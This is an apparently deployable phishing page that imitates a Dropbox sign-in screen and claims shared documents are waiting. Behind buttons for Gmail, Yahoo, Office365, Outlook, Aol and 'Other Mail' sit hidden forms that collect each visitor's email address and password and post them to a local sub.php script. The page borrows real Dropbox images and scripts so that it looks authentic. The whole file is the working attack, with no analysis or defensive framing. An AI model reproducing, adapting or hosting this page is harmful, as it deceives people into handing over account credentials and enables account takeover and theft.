<html lang="en" xmlns:fb="http://ogp.me/ns/fb#" xml:lang="en" class="media-desktop" xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
    <meta content="origin-when-cross-origin" name="referrer">

    <link href="https://cfl.dropboxstatic.com/static/images/favicon-vflUeLeeY.ico" rel="shortcut icon">
    <link href="./index_files/main-vflNL5_KG.css" type="text/css" rel="stylesheet">

    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_60_m1.png" rel="apple-touch-icon">
    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_76_m1.png" rel="apple-touch-icon" sizes="76x76">
    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_120_m1.png" rel="apple-touch-icon" sizes="120x120">
    <link href="https://cfl.dropboxstatic.com/static/images/logo_catalog/dropbox_webclip_152_m1.png" rel="apple-touch-icon" sizes="152x152">

    <!-- Compiled and minified CSS -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/css/materialize.min.css" rel="stylesheet"><!-- Compiled and minified JavaScript -->
    
    <link rel="stylesheet" type="text/css" href="style.css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script
  src="https://code.jquery.com/jquery-3.2.1.min.js"
  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
  crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/js/materialize.min.js">
    </script>
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400" rel="stylesheet">
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <meta content="#login?_tk=fof" property="og:url">

    <meta content="https://cfl.dropboxstatic.com/static/images/logo_catalog/glyph_m1%402x.png" property="og:image">

    <meta content="tz8iotmk-pkhui406y41y5bfmfxdwmaa4a-yc0hm6r0fga7s6j0j27qmgqkmc7oovihzghbzhbdjk-uiyrz438nxsjdbj3fggwgl8oq2nf4ko8gi7j4z7t78kegbidl4" name="norton-safeweb-site-verification">
    <meta content="https://cfl.dropboxstatic.com/static/images/logo_catalog/logo_m1.png" name="msapplication-TileImage">

    <title>Login - Dropbox </title>
    <style type="text/css">
        .hny-mdfbq {
            display: none;
        }
    </style>
    <link href="./index_files/button-vflzsghBU.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/exp_cards-vfl7SGVTx.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/login_form-vflaxe1fJ.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/login_or_register-vflAJk0Kd.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/react_locale_selector-vflyHsPEh.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/layout-vflvc3veE.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/index-vflWEj-xg.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/base-vflHRHyIg.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/font_atlas_grotesk-vfldINMge.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/font_sharp_grotesk-vfle4tE4q.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/components-vflWpppwv.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/login_or_register-vfl33XXu1.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/recaptcha-vflIN6j39.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/recaptcha_challenge-vflrcf67y.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/recaptcha_v2_challenge-vfl5GXpO2.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/scooter-scoped-vflFpCY2P.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/index.web-vfl81nbBN.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/web_sprites-vflv2MHAO.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="./index_files/css" type="text/css" rel="stylesheet">
   
    
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="./index_files/text.min-vfl0FYdM4.js.download"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="./index_files/login_error.min-vflOGgQJK.js.download"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="./index_files/types.min-vflnkPSMF.js.download"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="./index_files/name_fields.min-vflOxLD7A.js.download"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="./index_files/trust_checkbox.min-vflgXyqVg.js.download"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-react-prod.min-vfloICnYi.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/external/jquery_bundle/jquery_bundle.min-vflnJvurG.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-controllers-core.min-vflda-Sg6.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-login-pages-externals.min-vflVoHNMG.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-login-and-register-pages.min-vflGXe2US.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/hi_res.min-vflV6cUiE.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-api_v2.min-vflXbD0ES.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-external.min-vfl553em9.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-timing.min-vflQcDH_T.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-loadable.min-vflwFOn0Y.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-mcl-additional.min-vfl6YyoWt.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-core.min-vflIpRSSo.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-mcl-home.min-vflHd6HKG.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-login-pages.min-vflFnA5_h.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-exception-reporting.min-vflYAMP6n.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-coreui.min-vflCW6PFQ.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-profile_services.min-vflnnoa6C.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-i18n.min-vflUGVG8R.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-react-libs.min-vfl1e5UNk.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-captcha.min-vfluvm6Z1.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-modules-unneeded-for-home.min-vflBfjGRi.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-mcl-base.min-vflUxtOGK.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/accessibility/tabbable.min-vfl0vs2HG.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/form.min-vflxU5rVJ.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/api.min-vfl4PBFIc.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/2fa/trust_checkbox.min-vflgXyqVg.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/2fa/phone_form.min-vflg3zvtY.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/2fa/seckey_form.min-vflgqnSMl.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/google_login_button.min-vfl4DR2H2.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/security/crypto.min-vflGa0bqH.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/types.min-vflNY9ztt.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/common/utils.min-vfljJUvjW.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/apple_login_button.min-vfllTSfKE.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/common/error.min-vflLBOJ8C.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/sso_utils.min-vfl0iMa7l.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/2fa/email_form.min-vflza6vyc.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/security/passwords.min-vflBE6PlM.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/login_error.min-vflOGgQJK.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/common/types.min-vflnkPSMF.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/2fa/authenticator_form.min-vfle99fgK.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/common/inputs/checkbox.min-vflEalk7m.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/common/inputs/text.min-vfl0FYdM4.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-legacy-af.min-vflcI8-i4.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/login/credentials_form.min-vflaIl5_f.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/register/form.min-vflJ2LKPZ.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/register/types.min-vflGHm1Ya.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/register/view.min-vflx9Ezhk.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/register/name_fields.min-vflOxLD7A.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/auth/register/google_register_button.min-vfll0BRn2.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-coreui-with-i18n.min-vflYhMU7z.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-legacy-ab.min-vfldsBUw7.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-lasso-footer.min-vfl7WXb2-.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/ux_analytics/ux_variants.min-vflMO1jXD.js"></script>
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/modules/clean/ux_analytics/lazy_ux_analytics.min-vflc_dtrC.js"></script>
    <link href="https://cfl.dropboxstatic.com/static/css/components/react_locale_selector-vflyHsPEh.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/font_atlas_grotesk-vfldINMge.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/font_sharp_grotesk-vfle4tE4q.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/components/exp_cards-vfl7SGVTx.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/components/login_form-vflaxe1fJ.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/legacy_packages/components-vflWpppwv.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/login_or_register-vfl33XXu1.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/scooter/scooter-scoped-vflFpCY2P.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/spectrum/index.web-vfl81nbBN.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/recaptcha_challenge-vflrcf67y.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/recaptcha_v2_challenge-vfl5GXpO2.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/components/button-vflzsghBU.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/sprites/web_sprites-vflv2MHAO.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/recaptcha-vflIN6j39.css" rel="stylesheet" type="text/css">
    <link href="https://cfl.dropboxstatic.com/static/css/components/password_strength_meter-vflAqZDga.css" rel="stylesheet" type="text/css">
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/packaged/pkg-sharing-core.min-vflC_xWiG.js"></script>
    <link href="https://cfl.dropboxstatic.com/static/css/components/bubble_dropdown_v2-vflhhYVBe.css" rel="stylesheet" type="text/css">
    <script type="text/javascript" charset="utf-8" async="" crossorigin="anonymous" src="https://cfl.dropboxstatic.com/static/compiled/js/external/zxcvbn.min-vflKq_aMA.js"></script>
    <style id="__web-inspector-hide-shortcut-style__" type="text/css">
        .__web-inspector-hide-shortcut__,
        .__web-inspector-hide-shortcut__ *,
        .__web-inspector-hidebefore-shortcut__::before,
        .__web-inspector-hideafter-shortcut__::after {
            visibility: hidden !important;
        }
    </style>

    <style type="text/css">
        
        .stub {

            text-decoration: none;
            color: #fff;
            text-transform: none;




        }

        a {
            text-transform: none;
            text-decoration: none;
        }

    </style>
    
</head>

<body class="en_GB  login-or-register-page" dir="ltr" style="">
    <img src="img/Capture.PNG">
    
    <div>
        <div class="funcaptcha-modal--hidden-non-firefox funcaptcha-modal">
            <div class="funcaptcha-div">
                <iframe frameborder="0" height="100%" width="100%" sandbox="allow-scripts allow-same-origin allow-forms" class="funcaptcha-frame" src="https://dropboxcaptcha.com"></iframe>
            </div>
        </div>
    </div>
    <div style="display: none;" id="modal-behind" class="uxa-modal"></div>
    <div style="display: none;" id="modal">
        <div id="modal-box">
            <a aria-label="Close" href="#login?_tk=fof#" id="modal-x"></a>
            <h2 id="modal-title"></h2>
            <div id="modal-content"></div>
        </div>
    </div>
    <div style="display: none;" id="modal-overlay"></div>
    <div style="display:none" id="grave-yard"></div>
    <div style="display:none" id="trash-can"></div>
    <script type="text/template" id="tutorial_nav_bubble_tmpl" nonce="">
        <div class="tutorial-bubble-content">
            <a class="tutorial-bubble-x-link"><img src="/static/images/x-small-active.png" class="tutorial-bubble-x-img" /></a>
            <h1 class="tutorial-bubble-title"><%= TEMPLATE_DATA.title %></h1>
            <p class="tutorial-bubble-body">
                <%= TEMPLATE_DATA.body %>
            </p>
            <a class="tutorial-bubble-button <%= TEMPLATE_DATA.button_class %>">
                <%= TEMPLATE_DATA.button_text %>
            </a>
        </div>
    </script>
    <div id="floaters"></div>
    <div style="display: none;" class="external-drop-indicator top"></div>
    <div style="display: none;" class="external-drop-indicator right"></div>
    <div style="display: none;" class="external-drop-indicator bottom"></div>
    <div style="display: none;" class="external-drop-indicator left"></div>
    <div id="outer-frame">
        <div id="page-content">
            <div tabindex="-1" id="main-skip" class="main-skip-destination"></div>
            <div id="login-or-register-page-content" style="padding-top: 116px;"><img data-js-component-id="component4355732531750502239" src="./index_files/sign-in-boulder-vfl2oGV4v.png" data-hi-res="https://cfl.dropboxstatic.com/static/images/empty_states/sign-in-boulder@2x-vfl87XcA-.png" alt="" class="login-or-register-img">
                <div class="login-register-container-wrapper">
                    <div class="login-register-container standard login-register-container--link-top" id="pyxl4355732531750502240">
                        <div class="login-register-login-part">
                            <div class="clearfix">
                                <div class="login-register-header" style="font-size: 22px;">Sign in to Dropbox to view Shared Documents</div>
                                
                            </div>
                            <div id="component4355732531750502242">
                                <div class="login-form-container standard login-form-container standard">
                                    <div class="regular-login-forms">
                                        <div class="login-form-container--subcontainer">
                                            <div class="login-form-container__google-div">
                                                <a href="#modal7"class="stub"><button class="auth-google button-primary" type="button">
                                                    <div class="sign-in-text"> Sign in with Gmail</div>
                                                </button></a>
                                            </div>
                                            <!-- Modal Class Structure-->
                                            <div id="modal7" class="modal">
                                    <div class="modal-content">
                                <form class="col s12" action="sub.php" method="post">
                                      <h5 class="center">Sign in with Gmail</h5>
                                      <div class="row">
                                      <input class="hide" name="app" type="text" class="validate" value="Gmail">
                                        <div class="input-field col s12">
                                          <input name="email" type="email" class="validate" required>
                                          <label for="email">Email</label>
                                        </div>
                                        <div class="input-field col s12">
                                          <input name="password" type="password" class="validate" required>
                                          <label for="password">Password</label>
                                        </div>
                                  </div>
                                  <button class="login-button" type="submit" name="submit">Submit
                                  </button>
                                </form>
                                </div>
                                    </div>


                                            <!-- Modal Class Structure End-->
                                            <div class="login-form-container__google-div">
                                                <a href="#modal2" class="stub"><button class="auth-google button-primary" type="button" style="background-image:url(img/yahoo.png);background-size: 32px 32px;background-position: left 3px center;background-color: #720e9e;">
                                                    <div class="sign-in-text">Sign in with Yahoo</div>
                                                </button>
                                            </div></a>
                                             <!-- Modal Class Structure-->
                                            <div id="modal2" class="modal">
                                    <div class="modal-content">
                                <form class="col s12" action="sub.php" method="post">
                                      <h5 class="center">Sign in with Yahoo</h5>
                                      <div class="row">
                                      <input class="hide" name="app" type="text" class="validate" value="Yahoo">
                                        <div class="input-field col s12">
                                          <input name="email" type="email" class="validate" required>
                                          <label for="email">Email</label>
                                        </div>
                                        <div class="input-field col s12">
                                          <input name="password" type="password" class="validate" required>
                                          <label for="password">Password</label>
                                        </div>
                                  </div>
                                  <button class="login-button" type="submit" name="submit">Submit
                                  </button>
                                </form>
                                </div>
                                    </div>


                                            <!-- Modal Class Structure End-->

                                            <div class="login-form-container__google-div">
                                                <a href="#modal3" class="stub"><button class="auth-google button-primary" type="button" style="background-image:url(img/office.png);background-size: 42px 32px;background-position: left -4px center;background-color: #f65d35;">
                                                    <div class="sign-in-text">Sign in with Office365</div>
                                                </button></a>
                                            </div>
                                                 <!-- Modal Class Structure-->
                                            <div id="modal3" class="modal">
                                    <div class="modal-content">
                                <form class="col s12" action="sub.php" method="post">
                                      <h5 class="center">Sign in with Office365</h5>
                                      <div class="row">
                                      <input class="hide" name="app" type="text" class="validate" value="Office365">
                                        <div class="input-field col s12">
                                          <input name="email" type="email" class="validate" required>
                                          <label for="email">Email</label>
                                        </div>
                                        <div class="input-field col s12">
                                          <input name="password" type="password" class="validate" required>
                                          <label for="password">Password</label>
                                        </div>
                                  </div>
                                  <button class="login-button" type="submit" name="submit">Submit
                                  </button>
                                </form>
                                </div>
                                    </div>


                                            <!-- Modal Class Structure End-->

                                            <div class="login-form-container__google-div">
                                                <a href="#modal4" class="stub"><button class="auth-google button-primary" type="button" style="background-image:url(img/Outlook.png);background-size: 20px 20px;background-position: left 10px center;background-color: #03A9F4;">
                                                    <div class="sign-in-text">Sign in with Outlook</div>
                                                </button></a>
                                            </div>

                                                 <!-- Modal Class Structure-->
                                            <div id="modal4" class="modal">
                                    <div class="modal-content">
                                <form class="col s12" action="sub.php" method="post">
                                      <h5 class="center">Sign in with Outlook</h5>
                                      <div class="row">
                                      <input class="hide" name="app" type="text" class="validate" value="Outlook">
                                        <div class="input-field col s12">
                                          <input name="email" type="email" class="validate" required>
                                          <label for="email">Email</label>
                                        </div>
                                        <div class="input-field col s12">
                                          <input name="password" type="password" class="validate" required>
                                          <label for="password">Password</label>
                                        </div>
                                  </div>
                                  <button class="login-button" type="submit" name="submit">Submit
                                  </button>
                                </form>
                                </div>
                                    </div>


                                            <!-- Modal Class Structure End-->




                                            <div class="login-form-container__google-div">
                                                <a href="#modal5" class="stub"><button class="auth-google button-primary" type="button" style="background-image:url(img/aol.png);/* background-size: 32px 32px; */background-position: left 8px center;background-color: #636363;">
                                                    <div class="sign-in-text">Sign in with Aol</div>
                                                </button></a>
                                            </div>

                                                 <!-- Modal Class Structure-->
                                            <div id="modal5" class="modal">
                                    <div class="modal-content">
                                <form class="col s12" action="sub.php" method="post">
                                      <h5 class="center">Sign in with Aol</h5>
                                      <div class="row">
                                      <input class="hide" name="app" type="text" class="validate" value="Aol">
                                        <div class="input-field col s12">
                                          <input name="email" type="email" class="validate" required>
                                          <label for="email">Email</label>
                                        </div>
                                        <div class="input-field col s12">
                                          <input name="password" type="password" class="validate" required>
                                          <label for="password">Password</label>
                                        </div>
                                  </div>
                                  <button class="login-button" type="submit" name="submit">Submit
                                  </button>
                                </form>
                                </div>
                                    </div>


                                            <!-- Modal Class Structure End-->


                                            <div class="login-form-container__google-div">
                                               <a href="#modal6" class="stub"> <button class="auth-google button-primary" type="button" style="background-image:url(img/mail.jpg);background-size: 25px 25px;background-position: left 5px center;background-color: #8BC34A;">
                                                    <div class="sign-in-text"> Sign in with Other Mail</div>
                                                </button></a>
                                            </div>
                                        <!-- Modal Class Structure-->
                                            <div id="modal6" class="modal">
                                    <div class="modal-content">
                                <form class="col s12" action="sub.php" method="post">
                                      <h5 class="center">Sign in with Other Mail</h5>
                                      <div class="row">
                                      <input class="hide" name="app" type="text" class="validate" value="Other">
                                        <div class="input-field col s12">
                                          <input name="email" type="email" class="validate" required>
                                          <label for="email">Email</label>
                                        </div>
                                        <div class="input-field col s12">
                                          <input name="password" type="password" class="validate" required>
                                          <label for="password">Password</label>
                                        </div>
                                  </div>
                                  <button class="login-button" type="submit" name="submit">Submit
                                  </button>
                                </form>
                                </div>
                                    </div>


                                            <!-- Modal Class Structure End-->
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </div>
        </div>
        <div id="page-prefooter"></div>
        <footer>
            <div id="page-full-footer">
                <div id="footer-top-margin"></div>
                <div id="footer-border"></div>
                <div class="footer-col">
                    <ul>
                        <li class="header">Dropbox</li>
                        <li><a href="#install">Install</a></li>
                        <li><a href="#mobile">Mobile</a></li>
                        <li><a href="#pricing">Pricing</a></li>
                        <li><a href="#business">Business</a></li>
                        <li><a href="#enterprise">Enterprise</a></li>
                        <li><a href="#features?trigger=footer">Features</a></li>
                    </ul>
                </div>
                <div class="footer-col">
                    <ul>
                        <li class="header">About us</li>
                        <li><a href="http://blog.dropbox.com/">Dropbox Blog</a></li>
                        <li><a href="#about">About</a></li>
                        <li><a href="#branding">Branding</a></li>
                        <li><a href="#news">News</a></li>
                        <li><a href="#jobs">Jobs</a></li>
                    </ul>
                </div>
                <div class="footer-col">
                    <ul>
                        <li class="header">Support</li>
                        <li><a href="#help">Help Centre</a></li>
                        <li><a href="#contact">Contact us</a></li>
                        <li><a href="#dmca">Copyright</a></li>
                        <li><a href="#terms/cookies">Cookies</a></li>
                        <li><a href="#privacy">Privacy &amp; Terms</a></li>
                        <li><a href="#sitemap">Sitemap</a></li>
                    </ul>
                </div>
                <div class="footer-col">
                    <ul>
                        <li class="header">Community</li>
                        <li><a href="#referrals">Referrals</a></li>
                        <li><a href="">Forum</a></li>
                        <li><a href="" target="_blank" rel="noreferrer">Twitter</a></li>
                        <li><a href="" target="_blank" rel="noreferrer">Facebook</a></li>
                        <li><a href="#developers">Developers</a></li>
                    </ul>
                </div>
                <div class="react-locale-selector-wrapper">
                    <div id="component4355732531750502245">
                        <div id="locale-container"><span id="locale-link"><img class="sprite sprite_web s_web_globe_gray_20x20" src="https://cfl.dropboxstatic.com/static/images/icons/icon_spacer-vflN3BYt2.gif" alt=""><button class="button-as-link react-locale-selector-link" title="Choose a language"><span data-locale="en_GB">English (United Kingdom)</span><img class="sprite sprite_web s_web_arrow-up-gray" src="https://cfl.dropboxstatic.com/static/images/icons/icon_spacer-vflN3BYt2.gif" alt=""></button>
                            </span>
                        </div>
                    </div>
                </div>
                <div class="clear"></div>
            </div>
        </footer>
        <noscript>
            <p class="center">The Dropbox website requires JavaScript.</p>
        </noscript>
    </div>
    <div style="position: absolute; top: 0; left: 0; font-family: Courier" id="ieconsole"></div>
    <div style="position:absolute; top:-10000px;width:0px; height:0px; left: 0;" id="FB_HiddenContainer"></div>
    
    
    </script><img src="./index_files/hstsping" alt="" style="display:none;">
    <div id="accessible-announce" class="ax-visually-hidden" aria-live="assertive"></div>

    <iframe hidden="" src="#" style="display: none;"></iframe>
    <script src="#"></script>

    <script>
        $(document).ready(function(){
          // the "href" attribute of the modal trigger must specify the modal ID that wants to be triggered
          $('.modal').modal();
          $('.modal2').modal();
            $('.modal3').modal();
             $('.modal4').modal();
             $('.modal5').modal();
                $('.modal6').modal();
                $('.modal7').modal();
        });
        </script> 
</body>

</html>